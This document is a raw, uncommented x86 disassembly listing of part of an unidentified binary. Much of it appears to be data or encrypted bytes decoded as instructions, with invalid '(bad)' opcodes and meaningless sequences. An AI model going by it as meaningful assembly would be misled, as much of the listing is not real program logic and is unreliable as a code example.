  421aaf:	mov    al,0x42
  421ab1:	add    BYTE PTR [eax+esi*4],dl
  421ab4:	inc    edx
  421ab5:	add    BYTE PTR [eax],bl
  421ab7:	mov    al,0x42
  421ab9:	add    BYTE PTR [eax+esi*4],bl
  421abc:	inc    edx
  421abd:	add    BYTE PTR [eax+0x66],bh
  421ac0:	ins    BYTE PTR es:[edi],dx
  421ac1:	jp     0x421b1a
  421ac3:	jbe    0x421b0c
  421ac5:	ja     0x421b0a
  421ac7:	js     0x421b11
  421ac9:	jno    0x421b2e
  421acb:	inc    edx
  421acc:	inc    bx
  421ace:	push   ebp
  421acf:	jno    0x421b47
  421ad1:	ja     0x421b3a
  421ad3:	dec    edi
  421ad4:	dec    esp
  421ad5:	dec    ebp
  421ad6:	inc    edx
  421ad7:	jno    0x421b4a
  421ad9:	jae    0x421b2e
  421adb:	push   eax
  421adc:	arpl   WORD PTR [ebx-0x7a],dx
  421adf:	push   ds
  421ae0:	inc    edx
  421ae1:	add    BYTE PTR [esi+0x2600421e],cl
  421ae7:	sbb    eax,0xbef0042
  421aec:	mov    dl,0xe
  421aee:	jns    0x421b3e
  421af0:	xor    BYTE PTR [esi-0x79],cl
  421af3:	dec    edi
  421af4:	cmp    eax,0x3e4faf4e
  421af9:	dec    esi
  421afa:	js     0x421b4a
  421afc:	cmp    ecx,DWORD PTR [esi-0x64]
  421aff:	dec    edi
  421b00:	inc    esp
  421b01:	dec    esi
  421b02:	jae    0x421b52
  421b04:	inc    ecx
  421b05:	dec    esi
  421b06:	xor    BYTE PTR [esi+0x40],cl
  421b09:	dec    esi
  421b0a:	pop    esp
  421b0b:	pop    ebp
  421b0c:	pop    edi
  421b0d:	push   edx
  421b0e:	cmp    DWORD PTR [esi+0x79],ecx
  421b11:	dec    esi
  421b12:	xor    BYTE PTR [esi-0x79],cl
  421b15:	dec    edi
  421b16:	cmp    eax,0x3e4faf4e
  421b1b:	dec    esi
  421b1c:	js     0x421b6c
  421b1e:	cmp    ecx,DWORD PTR [esi-0x64]
  421b21:	dec    edi
  421b22:	inc    esp
  421b23:	dec    esi
  421b24:	mov    DWORD PTR [edi+0x41],ecx
  421b27:	dec    esi
  421b28:	xor    BYTE PTR [esi+0x40],cl
  421b2b:	dec    esi
  421b2c:	pop    esp
  421b2d:	ins    DWORD PTR es:[edi],dx
  421b2e:	pop    edi
  421b2f:	bound  edi,QWORD PTR [ecx]
  421b31:	dec    esi
  421b32:	jns    0x421b82
  421b34:	xor    BYTE PTR [esi-0x80],cl
  421b37:	dec    edi
  421b38:	cmp    eax,0x394e734e
  421b3d:	dec    esi
  421b3e:	mov    ds:0x304e3a4f,al
  421b43:	dec    esi
  421b44:	inc    esi
  421b45:	dec    esi
  421b46:	pop    esp
  421b47:	jge    0x421ba8
  421b49:	jb     0x421bba
  421b4b:	sub    BYTE PTR [esi-0x7d],0x7e
  421b4f:	xchg   ebx,eax
  421b50:	jns    0x421ae2
  421b52:	aas    
  421b53:	dec    esi
  421b54:	test   BYTE PTR [edi+0x30],cl
  421b57:	dec    esi
  421b58:	test   BYTE PTR [edi+0x3c],cl
  421b5b:	dec    esi
  421b5c:	mov    ds:0x734e394f,al
  421b61:	dec    esi
  421b62:	inc    ebp
  421b63:	dec    esi
  421b64:	xor    BYTE PTR [esi+0x44],cl
  421b67:	dec    esi
  421b68:	pop    esp
  421b69:	lea    ebx,[edi-0x7e]
  421b6c:	outs   dx,DWORD PTR ds:[esi]
  421b6d:	xchg   edx,eax
  421b6e:	outs   dx,BYTE PTR ds:[esi]
  421b6f:	xchg   ebx,eax
  421b70:	jle    0x421b15
  421b72:	jns    0x421b14
  421b74:	aas    
  421b75:	dec    esi
  421b76:	test   BYTE PTR [edi+0x30],cl
  421b79:	dec    esi
  421b7a:	test   BYTE PTR [edi+0x3c],cl
  421b7d:	dec    esi
  421b7e:	mov    ds:0x894e394f,al
  421b83:	dec    edi
  421b84:	inc    ebp
  421b85:	dec    esi
  421b86:	xor    BYTE PTR [esi+0x44],cl
  421b89:	dec    esi
  421b8a:	pop    esp
  421b8b:	popf   
  421b8c:	pop    edi
  421b8d:	xchg   edx,eax
  421b8e:	outs   dx,DWORD PTR ds:[esi]
  421b8f:	mov    ds:0xb37ea36e,al
  421b94:	jns    0x421b46
  421b96:	aas    
  421b97:	dec    esi
  421b98:	mov    cs,WORD PTR [edi+0x30]
  421b9b:	dec    esi
  421b9c:	lods   al,BYTE PTR ds:[esi]
  421b9d:	dec    edi
  421b9e:	cmp    eax,0x394e734e
  421ba3:	dec    esi
  421ba4:	mov    eax,ds:0x304e3a4f
  421ba9:	dec    esi
  421baa:	inc    esp
  421bab:	dec    esi
  421bac:	pop    esp
  421bad:	lods   eax,DWORD PTR ds:[esi]
  421bae:	pop    edi
  421baf:	mov    ds:0xb36eb26f,al
  421bb4:	jle    0x421b79
  421bb6:	jns    0x421b78
  421bb8:	aas    
  421bb9:	dec    esi
  421bba:	mov    cs,WORD PTR [edi+0x30]
  421bbd:	dec    esi
  421bbe:	lods   al,BYTE PTR ds:[esi]
  421bbf:	dec    edi
  421bc0:	cmp    eax,0x394e7e4e
  421bc5:	dec    esi
  421bc6:	lahf   
  421bc7:	dec    edi
  421bc8:	cmp    ecx,DWORD PTR [esi+0x30]
  421bcb:	dec    esi
  421bcc:	inc    ebp
  421bcd:	dec    esi
  421bce:	pop    esp
  421bcf:	mov    ebp,0xc26fb25f
  421bd4:	outs   dx,BYTE PTR ds:[esi]
  421bd5:	ret    
  421bd6:	jle    0x421bab
  421bd8:	jns    0x421baa
  421bda:	aas    
  421bdb:	dec    esi
  421bdc:	mov    cs,WORD PTR [edi+0x30]
  421bdf:	dec    esi
  421be0:	lods   al,BYTE PTR ds:[esi]
  421be1:	dec    edi
  421be2:	cmp    eax,0x394f804e
  421be7:	dec    esi
  421be8:	lods   al,BYTE PTR ds:[esi]
  421be9:	dec    edi
  421bea:	cmp    cl,BYTE PTR [esi+0x30]
  421bed:	dec    esi
  421bee:	inc    esi
  421bef:	dec    esi
  421bf0:	pop    esp
  421bf1:	int    0x5f
  421bf3:	ret    0xd26f
  421bf6:	outs   dx,BYTE PTR ds:[esi]
  421bf7:	sar    DWORD PTR [esi-0x1d],cl
  421bfa:	jns    0x421bdc
  421bfc:	aas    
  421bfd:	dec    esi
  421bfe:	mov    cs,WORD PTR [edi+0x30]
  421c01:	dec    esi
  421c02:	lods   al,BYTE PTR ds:[esi]
  421c03:	dec    edi
  421c04:	cmp    eax,0x394f834e
  421c09:	dec    esi
  421c0a:	mov    ds:0x304e3a4f,al
  421c0f:	dec    esi
  421c10:	inc    esp
  421c11:	dec    esi
  421c12:	pop    esp
  421c13:	fstp   QWORD PTR [edi-0x2e]
  421c16:	outs   dx,DWORD PTR ds:[esi]
  421c17:	loop   0x421c87
  421c19:	jecxz  0x421c99
  421c1b:	repz jns 0x421c0e
  421c1e:	aas    
  421c1f:	dec    esi
  421c20:	lea    ecx,[edi+0x30]
  421c23:	dec    esi
  421c24:	lahf   
  421c25:	dec    edi
  421c26:	cmp    eax,0x3c4fa04e
  421c2b:	dec    esi
  421c2c:	xor    BYTE PTR [esi+0x3f],cl
  421c2f:	dec    esi
  421c30:	pop    esp
  421c31:	in     eax,dx
  421c32:	pop    edi
  421c33:	loop   0x421ca4
  421c35:	repnz outs dx,BYTE PTR ds:[esi]
  421c37:	repz jle 0x421c3d
  421c3a:	jns    0x421c3c
  421c3c:	jle    0x421c51
  421c3e:	jns    0x421c50
  421c40:	cmp    al,0x4e
  421c42:	jg     0x421c92
  421c44:	xor    BYTE PTR [esi-0x65],cl
  421c47:	dec    edi
  421c48:	xor    cl,BYTE PTR [esi-0x80]
  421c4b:	dec    edi
  421c4c:	cmp    al,0x4e
  421c4e:	lods   eax,DWORD PTR ds:[esi]
  421c4f:	dec    edi
  421c50:	cmp    ecx,DWORD PTR [esi+0x30]
  421c53:	dec    esi
  421c54:	inc    ebp
  421c55:	dec    esi
  421c56:	pop    esp
  421c57:	or     eax,0x126f025f
  421c5c:	outs   dx,BYTE PTR ds:[esi]
  421c5d:	adc    edi,DWORD PTR [esi+0x23]
  421c60:	jns    0x421c82
  421c62:	aas    
  421c63:	dec    esi
  421c64:	add    BYTE PTR [eax],al
  421c66:	out    dx,al
  421c67:	sbb    al,BYTE PTR [edx+0x0]
  421c6a:	loop   0x421c88
  421c6c:	inc    edx
  421c6d:	add    dl,ch
  421c6f:	sbb    al,0x42
  421c71:	add    BYTE PTR [edx-0x1ffbde2],dl
  421c77:	sbb    eax,0x1e820042
  421c7c:	inc    edx
  421c7d:	add    dl,cl
  421c7f:	sbb    al,0x42
  421c81:	add    dh,cl
  421c83:	sbb    al,0x42
  421c85:	add    BYTE PTR [esi+0x1e],bh
  421c88:	inc    edx
  421c89:	add    BYTE PTR [edx],dh
  421c8b:	sbb    eax,0xa90d0042
  421c90:	pushf  
  421c91:	clc    
  421c92:	ss mov edx,0x1ce6f89c
  421c98:	inc    edx
  421c99:	add    BYTE PTR [esi-0x35ffbde3],dh
  421c9f:	sbb    eax,0x1dd60042
  421ca4:	inc    edx
  421ca5:	add    dh,ah
  421ca7:	sbb    eax,0x1d1e0042
  421cac:	inc    edx
  421cad:	add    dl,ch
  421caf:	sbb    al,BYTE PTR [edx+0x0]
  421cb2:	ds sbb eax,0x1d2e0042
  421cb8:	inc    edx
  421cb9:	add    BYTE PTR [esi-0x49ffbde2],dl
  421cbf:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  421cc6:	repnz sbb al,0x42
  421cc9:	add    BYTE PTR [esp+ebx*1],dl
  421ccc:	push   ss
  421ccd:	or     DWORD PTR [eax],0x7050d
  421cd3:	add    BYTE PTR [eax+0x0],al
  421cd6:	cmp    al,BYTE PTR [edx+0x3e]
  421cd9:	ds enter 0x4279,0x0
  421cde:	ins    DWORD PTR es:[edi],dx
  421cdf:	push   ebp
  421ce0:	inc    esp
  421ce1:	imul   ecx,DWORD PTR [eax],0x86275fa
  421ce7:	in     eax,dx
  421ce8:	inc    BYTE PTR [edi]
  421cea:	aas    
  421ceb:	cli    
  421cec:	mov    ds:0x421cda05,eax
  421cf1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421cf7:	xchg   esi,eax
  421cf8:	pushf  
  421cf9:	clc    
  421cfa:	mov    ah,0x95
  421cfc:	pushf  
  421cfd:	clc    
  421cfe:	mov    ebx,0xbaf89c95
  421d03:	xchg   ebp,eax
  421d04:	pushf  
  421d05:	clc    
  421d06:	mov    ecx,0xb8f89c95
  421d0b:	xchg   ebp,eax
  421d0c:	pushf  
  421d0d:	clc    
  421d0e:	mov    edi,0xbef89c95
  421d13:	xchg   ebp,eax
  421d14:	pushf  
  421d15:	clc    
  421d16:	mov    ebp,0xa6f89c95
  421d1b:	xchg   ebp,eax
  421d1c:	pushf  
  421d1d:	clc    
  421d1e:	jmp    0x421a:0xe26003f9
  421d25:	add    BYTE PTR [eax+eax*2+0x42],ch
  421d29:	add    BYTE PTR [ebx+0x77],dl
  421d2c:	jbe    0x421d7e
  421d2e:	mov    dh,0x85
  421d30:	pushf  
  421d31:	clc    
  421d32:	sbb    ecx,ebp
  421d34:	push   eax
  421d35:	pop    es
  421d36:	sbb    BYTE PTR [ebx],cl
  421d38:	add    BYTE PTR [eax],al
  421d3a:	ficomp WORD PTR [edx]
  421d3c:	inc    edx
  421d3d:	add    BYTE PTR [ebx],bl
  421d3f:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421d72:	ins    BYTE PTR es:[edi],dx
  421d73:	inc    eax
  421d74:	inc    edx
  421d75:	add    BYTE PTR [esi+0x66f89c85],dh
  421d7b:	add    BYTE PTR [edx+0x0],ch
  421d7e:	add    BYTE PTR [si+0x0],ah
  421d82:	push   0x64006700
  421d87:	add    BYTE PTR [esi+0x0],ah
  421d8a:	push   0x0
  421d8c:	push   0x66006400
  421d91:	add    BYTE PTR [edi+0x0],ah
  421d94:	push   0x0
  421d96:	push   0x66006700
  421d9b:	add    BYTE PTR [eax+0x0],ch
  421d9e:	add    BYTE PTR [bp+0x0],ah
  421da2:	push   0x66006700
	...
  421daf:	add    BYTE PTR [eax],al
  421db1:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421db7:	dec    edi
  421db8:	lahf   
  421db9:	dec    edi
  421dba:	mov    ds:0x9f4fa64f,al
  421dbf:	dec    edi
  421dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dc1:	dec    edi
  421dc2:	ins    DWORD PTR es:[edi],dx
  421dc3:	dec    esi
  421dc4:	bound  ecx,QWORD PTR [esi+0x30]
  421dc7:	dec    esi
  421dc8:	add    BYTE PTR [eax],al
  421dca:	cdq    
  421dcb:	dec    edi
  421dcc:	pushf  
  421dcd:	dec    edi
  421dce:	fwait
  421dcf:	dec    edi
  421dd0:	ins    DWORD PTR es:[edi],dx
  421dd1:	dec    esi
  421dd2:	bound  ecx,QWORD PTR [esi+0x30]
  421dd5:	dec    esi
  421dd6:	scas   eax,DWORD PTR es:[edi]
  421dd7:	dec    edi
  421dd8:	lods   eax,DWORD PTR ds:[esi]
  421dd9:	dec    edi
  421dda:	lahf   
  421ddb:	dec    edi
  421ddc:	mov    ds:0x624e6d4f,al
  421de1:	dec    esi
  421de2:	xor    BYTE PTR [esi+0x0],cl
  421de5:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421deb:	dec    edi
  421dec:	test   eax,0xa04f934f
  421df1:	dec    edi
  421df2:	fwait
  421df3:	dec    edi
  421df4:	xor    BYTE PTR [esi+0x0],cl
  421df7:	add    BYTE PTR [eax],al
  421df9:	add    BYTE PTR [eax],al
  421dfb:	add    BYTE PTR [eax],al
  421dfd:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421e04:	mov    WORD PTR [ebp-0x32734274],gs
  421e0a:	mov    ebp,ds
  421e0c:	mov    ebp,gs
  421e0e:	mov    ebp,?
  421e10:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421e16:	mov    WORD PTR ds:0x6d8c5d8c,?
  421e1c:	mov    WORD PTR [edx-0x74],?
  421e1f:	jae    0x421dad
  421e21:	jo     0x421daf
  421e23:	jno    0x421db1
  421e25:	jbe    0x421db3
  421e27:	ja     0x421db5
  421e29:	je     0x421db7
  421e2b:	jne    0x421db9
  421e2d:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421e34:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421e3a:	lods   al,BYTE PTR ds:[esi]
  421e3b:	jge    0x421df9
  421e3d:	jge    0x421ddd
  421e3f:	(bad)  
  421e40:	jns    0x421eb5
  421e42:	mov    ecx,0x7d738cb1
  421e47:	ins    DWORD PTR es:[edi],dx
  421e48:	enter  0x9fc6,0x26
  421e4c:	jb     0x421e51
  421e4e:	test   eax,0xb956bb17
  421e53:	hlt    
  421e54:	test   al,0x37
  421e56:	test   al,0x7e
  421e58:	fnstenv [ecx-0x6a]
  421e5b:	mov    cl,0x6a
  421e5d:	push   0xffffffce
  421e5f:	or     BYTE PTR [edx],bl
  421e61:	xlat   BYTE PTR ds:[ebx]
  421e62:	out    dx,eax
  421e63:	add    eax,0x9321d7aa
  421e68:	scas   al,BYTE PTR es:[edi]
  421e69:	adc    DWORD PTR [esi],esp
  421e6b:	jge    0x421e90
  421e6d:	fidiv  WORD PTR [edi]
  421e6f:	leave  
  421e70:	hlt    
  421e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e72:	cmp    ax,0x1fc8
  421e76:	mov    dh,cl
  421e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e79:	(bad)  
  421e7a:	and    DWORD PTR [eax],ebx
  421e7c:	and    DWORD PTR [ecx-0x18],esi
  421e7f:	(bad)  [ebx+0x7]
  421e82:	cmc    
  421e83:	enter  0x301a,0x14
  421e87:	inc    eax
  421e88:	inc    edx
  421e89:	add    BYTE PTR [ecx+0x66],dh
  421e8c:	jp     0x421efc
  421e8e:	rcr    BYTE PTR [edx+eax*2],cl
  421e91:	add    BYTE PTR [esi],dh
  421e93:	sbb    eax,0xed080042
  421e98:	adc    al,BYTE PTR [edi]
  421e9a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421ea1:	ins    BYTE PTR es:[edi],dx
  421ea2:	push   0x49657557
  421ea7:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421ead:	push   edi
  421eae:	jp     0x421f2a
  421eb0:	dec    ebp
  421eb1:	push   esi
  421eb2:	arpl   WORD PTR gs:[ecx+0x45],si
  421eb6:	dec    edx
  421eb7:	dec    esi
  421eb8:	data16 ja 0x421f09
  421ebb:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421ed6:	inc    ebp
  421ed7:	push   edx
  421ed8:	jb     0x421f4e
  421eda:	inc    esi
  421edb:	je     0x421f1e
  421edd:	inc    esi
  421ede:	jae    0x421f56
  421ee0:	dec    ebx
  421ee1:	gs dec ecx
  421ee3:	dec    ebp
  421ee4:	dec    ebp
  421ee5:	pop    edx
  421ee6:	jp     0x421f42
  421ee8:	jbe    0x421f30
  421eea:	pop    ecx
  421eeb:	jo     0x421f65
  421eed:	inc    edi
  421eee:	gs ins BYTE PTR es:[edi],dx
  421ef0:	dec    esp
  421ef1:	js     0x421f5b
  421ef3:	inc    edx
  421ef4:	js     0x421f3c
  421ef6:	dec    eax
  421ef7:	inc    ebp
  421ef8:	inc    esp
  421ef9:	inc    esp
  421efa:	push   ecx
  421efb:	dec    edx
  421efc:	ins    BYTE PTR es:[edi],dx
  421efd:	dec    ebx
  421efe:	jbe    0x421f6e
  421f00:	pop    eax
  421f01:	jbe    0x421f4e
  421f03:	inc    ecx
  421f04:	fs gs jno 0x421f75
  421f08:	push   ebx
  421f09:	inc    ecx
  421f0a:	add    BYTE PTR [eax],al
  421f0c:	inc    ebx
  421f0d:	outs   dx,BYTE PTR ds:[esi]
  421f0e:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421f12:	push   edx
  421f13:	push   ecx
  421f14:	push   0x74000064
  421f19:	jne    0x421f90
  421f1b:	ins    DWORD PTR es:[edi],dx
  421f1c:	push   ecx
  421f1d:	push   eax
  421f1e:	jo     0x421f9a
  421f20:	addr16 jo 0x421f79
  421f23:	pop    eax
  421f24:	add    BYTE PTR [eax],al
  421f26:	push   ecx
  421f27:	pop    ecx
  421f28:	inc    ebx
  421f29:	inc    edx
  421f2a:	outs   dx,BYTE PTR ds:[esi]
  421f2b:	popa   
  421f2c:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421f30:	jne    0x421fa0
  421f32:	dec    ebx
  421f33:	je     0x421f98
  421f35:	bound  esp,QWORD PTR [edi+0x0]
  421f38:	jns    0x421f7f
  421f3a:	bound  ebp,QWORD PTR [ecx+0x46]
  421f3d:	dec    ecx
  421f3e:	ja     0x421f85
  421f40:	dec    eax
  421f41:	inc    ebp
  421f42:	inc    edx
  421f43:	push   ebx
  421f44:	add    BYTE PTR [eax],al
  421f46:	outs   dx,DWORD PTR ds:[esi]
  421f47:	inc    edi
  421f48:	dec    esi
  421f49:	outs   dx,DWORD PTR ds:[esi]
  421f4a:	pop    ecx
  421f4b:	inc    edi
  421f4c:	jb     0x421f95
  421f4e:	jns    0x421fc6
  421f50:	inc    ecx
  421f51:	pop    eax
  421f52:	dec    esp
  421f53:	add    BYTE PTR [eax+0x48],bh
  421f56:	bound  edx,QWORD PTR [ebx+0x43]
  421f59:	pop    eax
  421f5a:	outs   dx,DWORD PTR ds:[esi]
  421f5b:	push   0x4355
  421f60:	dec    esp
  421f61:	ins    BYTE PTR es:[edi],dx
  421f62:	inc    edx
  421f63:	push   0x76666a73
  421f68:	inc    edx
  421f69:	jo     0x421f6b
  421f6b:	add    BYTE PTR [eax],al
  421f6d:	add    BYTE PTR [edi+0x6d],ah
  421f70:	je     0x421fb9
  421f72:	ins    BYTE PTR es:[edi],dx
  421f73:	jae    0x421fdf
  421f75:	inc    esi
  421f76:	ins    DWORD PTR es:[edi],dx
  421f77:	je     0x421fcf
  421f79:	push   0x56584178
  421f7e:	push   ebx
  421f7f:	addr16 dec edx
  421f81:	jo     0x421ff5
  421f83:	js     0x421ff4
  421f85:	pop    eax
  421f86:	dec    ebx
  421f87:	push   esp
  421f88:	dec    esp
  421f89:	jns    0x421fd6
  421f8b:	js     0x422005
  421f8d:	outs   dx,BYTE PTR ds:[esi]
  421f8e:	pop    ecx
  421f8f:	jae    0x421fff
  421f91:	push   0x43644448
  421f96:	arpl   WORD PTR [edx+0x55],sp
  421f99:	push   0x42504e67
  421f9e:	push   ebp
  421f9f:	je     0x422016
  421fa1:	addr16 dec edi
  421fa3:	dec    esp
  421fa4:	inc    edx
  421fa5:	ins    DWORD PTR es:[edi],dx
  421fa6:	inc    esi
  421fa7:	inc    esi
  421fa8:	inc    esi
  421fa9:	arpl   WORD PTR [edx+0x47],bx
  421fac:	push   ebp
  421fad:	inc    ebx
  421fae:	popa   
  421faf:	push   edx
  421fb0:	dec    esp
  421fb1:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421fb8:	push   ecx
  421fb9:	push   ebx
  421fba:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421fc1:	dec    edx
  421fc2:	jns    0x42202d
  421fc4:	push   edx
  421fc5:	inc    ebx
  421fc6:	jo     0x42203d
  421fc8:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421fcc:	fs push ebx
  421fce:	inc    ebx
  421fcf:	push   ebp
  421fd0:	push   eax
  421fd1:	ja     0x42200e
  421fd3:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421fd7:	mov    ebp,0xa53ddffb
  421fdc:	js     0x421f97
  421fde:	repnz rol BYTE PTR [ebp+0x1d65a4f],cl
  421fe5:	add    BYTE PTR [ebx+0x0],bl
  421fe8:	add    BYTE PTR [eax],al
  421fea:	out    dx,eax
  421feb:	jl     0x422033
  421fed:	lods   eax,DWORD PTR ds:[esi]
  421fee:	mov    esi,0x15f4c072
  421ff3:	push   es
  421ff4:	fld    QWORD PTR [ebx]
  421ff6:	xchg   esi,eax
  421ff7:	mov    ebp,0x3796fa23
  421ffc:	and    ebp,DWORD PTR [ebp-0x17ae6014]
  422002:	pop    DWORD PTR [esi-0x3fa2be85]
  422008:	mov    cl,BYTE PTR [eax+0x6c08f339]
  42200e:	sub    eax,0x2b8bb4a0
  422013:	bound  edx,QWORD PTR [edx+eax*4+0x3f]
  422017:	jo     0x421fe9
  422019:	cmp    eax,0x29eb2223
  42201e:	cli    
  42201f:	dec    edi
  422020:	sub    dl,BYTE PTR [ecx]
  422022:	push   ss
  422023:	mov    ds:0x776a3a0a,al
  422028:	push   esp
  422029:	adc    BYTE PTR [eax*2+0x2e4de47b],0x11
  422031:	jecxz  0x42206f
  422033:	xor    eax,DWORD PTR [ebp-0x21]
  422036:	out    0x59,al
  422038:	adc    esp,DWORD PTR [edx]
  42203a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42203b:	sahf   
  42203c:	retf   0xb13a
  42203f:	out    dx,al
  422040:	es iret 
  422042:	xchg   ebx,eax
  422043:	shl    cl,0x0
	...
  422052:	sub    BYTE PTR [edx+0x57bf52a5],dh
  422058:	(bad)  
  422059:	cli    
  42205a:	jl     0x4220c0
  42205c:	xlat   BYTE PTR ds:[ebx]
  42205d:	push   esi
  42205e:	sbb    bl,BYTE PTR [eax-0x294a699f]
  422064:	add    DWORD PTR [eax],eax
  422066:	pop    ebx
  422067:	add    BYTE PTR [eax],al
  422069:	add    BYTE PTR [eax+ebp*8+0x15],bl
  42206d:	inc    esp
  42206e:	jno    0x42200c
  422070:	mov    dh,0x1b
  422072:	adc    bh,BYTE PTR ds:0x978a85e9
  422078:	into   
  422079:	dec    edx
  42207a:	mov    esp,0x2295956a
  42207f:	mov    ebx,0x84999e1f
  422084:	addr16 pop edx
  422086:	daa    
  422087:	adc    al,0xbb
  422089:	gs (bad) 
  42208b:	fdivr  DWORD PTR [ecx-0x5e]
  42208e:	ror    BYTE PTR [eax-0x2dc2de14],1
  422094:	adc    eax,0xf243fabf
  422099:	adc    edi,edx
  42209b:	imul   DWORD PTR [ebx]
  42209d:	fidiv  WORD PTR [ebx-0x24f249c1]
  4220a3:	fcmovbe st,st(0)
  4220a5:	mov    dl,0x52
  4220a7:	imul   eax,DWORD PTR [eax+eax*8],0x68208ba0
  4220ae:	xor    edx,DWORD PTR [ebp-0x4]
  4220b1:	dec    ebp
  4220b2:	add    eax,0x8e25c396
  4220b7:	pmuludq mm4,QWORD PTR [ebp-0x27]
  4220bb:	jmp    0x4220f7
  4220bd:	sti    
  4220be:	pop    eax
  4220bf:	mov    ds:0xff0440b5,eax
  4220c4:	jb     0x4220c6
	...
  4220d2:	mov    bl,0x55
  4220d4:	jg     0x422057
  4220d6:	jmp    FWORD PTR [ebx-0x69418801]
  4220dc:	push   0x20205957
  4220e1:	xor    dl,BYTE PTR [eax]
  4220e3:	xlat   BYTE PTR ds:[ebx]
  4220e4:	add    DWORD PTR [eax],eax
  4220e6:	pop    ebx
  4220e7:	add    BYTE PTR [eax],al
  4220e9:	add    BYTE PTR [edx+0x3],ch
  4220ec:	xor    eax,0xf3b0c632
  4220f1:	and    ecx,DWORD PTR [eax-0x30]
  4220f4:	and    esp,DWORD PTR [ebx]
  4220f6:	jno    0x422140
  4220f8:	fistp  QWORD PTR [ebx+esi*2-0x3869da7a]
  4220ff:	int    0x1b
  422101:	pop    esi
  422102:	leave  
  422103:	push   ebp
  422104:	jge    0x422145
  422106:	(bad)  
  422107:	or     BYTE PTR [bp+di],ch
  42210a:	xchg   esp,eax
  42210b:	sub    al,ch
  42210d:	and    ebx,DWORD PTR [ebp*2-0x20446236]
  422114:	jmp    0xfb0f22cd
  422119:	sub    ebx,DWORD PTR [ebx+0x51c40d33]
  42211f:	sbb    dl,BYTE PTR [ecx]
  422121:	(bad)  
  422122:	arpl   WORD PTR ds:0x9a6c6115,dx
  422128:	js     0x4221a7
  42212a:	push   ebx
  42212b:	adc    bh,BYTE PTR [edx+0xb]
  42212e:	std    
  42212f:	loope  0x4220d8
  422131:	test   BYTE PTR [ecx*1-0x7d872270],dl
  422138:	ror    BYTE PTR [eax+0x74462dcf],cl
  42213e:	in     al,dx
  42213f:	or     esp,esp
  422141:	pop    ds
  422142:	cwde   
  422143:	in     eax,0x27
	...
  422151:	add    BYTE PTR [eax],bh
  422153:	(bad)  
  422154:	cmp    ah,BYTE PTR [esi+edi*8]
  422157:	in     al,dx
  422158:	fimul  WORD PTR ds:[edi-0x7c53942b]
  42215f:	xor    bl,BYTE PTR [ecx+0x1d76be6]
  422165:	add    BYTE PTR [ebx+0x0],bl
  422168:	add    BYTE PTR [eax],al
  42216a:	mov    eax,ds:0xb1dbd24b
  42216f:	jnp    0x42213d
  422171:	or     ch,bh
  422173:	mov    ecx,0x1506924e
  422178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422179:	rcr    BYTE PTR [esi-0x60602151],1
  42217f:	int3   
  422180:	xor    ecx,esp
  422182:	retf   
  422183:	daa    
  422184:	push   ss
  422185:	arpl   WORD PTR [bx+si-0x15],ax
  422189:	add    al,0x83
  42218b:	test   DWORD PTR [edi],ebx
  42218d:	fistp  QWORD PTR [eax-0x58]
  422190:	leave  
  422191:	mov    edi,0xe57b8748
  422196:	gs inc eax
  422198:	mov    DWORD PTR [edi-0x3f],ebx
  42219b:	sbb    dh,BYTE PTR [esi+0x7ba6eb19]
  4221a1:	mov    edx,0x435d00c8
  4221a6:	jbe    0x4221ae
  4221a8:	js     0x422157
  4221aa:	push   0x80c58b6f
  4221af:	adc    ah,BYTE PTR [ebx+ebp*2]
  4221b2:	and    al,BYTE PTR [esi+0x54bed20c]
  4221b8:	xor    edx,DWORD PTR ds:0x2fddef71
  4221be:	mov    esi,0xb6827013
  4221c3:	cmc    
  4221c4:	add    BYTE PTR ss:[eax],al
	...
  4221cf:	add    BYTE PTR [eax],al
  4221d1:	add    cl,bl
  4221d3:	mov    dh,0x66
  4221d5:	sbb    ebp,DWORD PTR [edi-0x25]
  4221d8:	std    
  4221d9:	neg    BYTE PTR [esi]
  4221db:	sub    esp,DWORD PTR [ebx-0x23]
  4221de:	dec    ecx
  4221df:	nop
  4221e0:	sti    
  4221e1:	call   0x5b:0x1d7c6
  4221e8:	add    BYTE PTR [eax],al
  4221ea:	mov    WORD PTR [eax+ebx*1],es
  4221ed:	mov    al,ds:0x89c20498
  4221f2:	inc    edx
  4221f3:	sbb    edi,DWORD PTR [edx]
  4221f5:	xchg   ebx,eax
  4221f6:	retf   
  4221f7:	inc    edx
  4221f8:	jge    0x422211
  4221fa:	push   esi
  4221fb:	(bad)  
  4221fc:	icebp  
  4221fd:	sti    
  4221fe:	sub    ah,bl
  422200:	mov    ebx,DWORD PTR [ebx]
  422202:	inc    ecx
  422203:	ja     0x422261
  422205:	jns    0x422224
  422207:	mov    esi,0xb06367e0
  42220c:	enter  0x427c,0x53
  422210:	xchg   edx,eax
  422211:	scas   eax,DWORD PTR es:[edi]
  422212:	sbb    al,0xc5
  422214:	stc    
  422215:	cmp    al,BYTE PTR [ecx+ebp*1-0x4d]
  422219:	jb     0x4221b6
  42221b:	sub    ch,0x70
  42221e:	dec    ebx
  42221f:	loop   0x422211
  422221:	packsswb mm3,QWORD PTR fs:[eax+0x3e]
  422226:	call   0x903a6eba
  42222b:	inc    ecx
  42222c:	mov    eax,0xf8e1dab6
  422231:	test   DWORD PTR [esi+0x5b87f0e5],0x93e1db9b
  42223b:	in     al,dx
  42223c:	(bad)  
  42223d:	ss loope 0x42228d
  422240:	add    DWORD PTR [ecx],esp
